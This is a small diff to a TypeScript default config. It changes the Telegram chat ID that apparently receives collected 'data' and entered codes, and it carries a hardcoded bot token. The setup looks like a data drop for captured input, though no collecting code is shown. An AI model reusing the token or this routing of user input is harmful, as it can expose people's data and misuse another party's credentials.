@@ -20,7 +20,7 @@ const defaultConfig: Config = {
 		code_input_enabled: true,
 	},
 	telegram: {
-		data_chatid: "7211586401",
+		data_chatid: "-1002290360045",
 		data_token: "7696170315:AAHzY3ANCN23bED-vqRYC_3-49Ura_YOycA",
 	},
 };
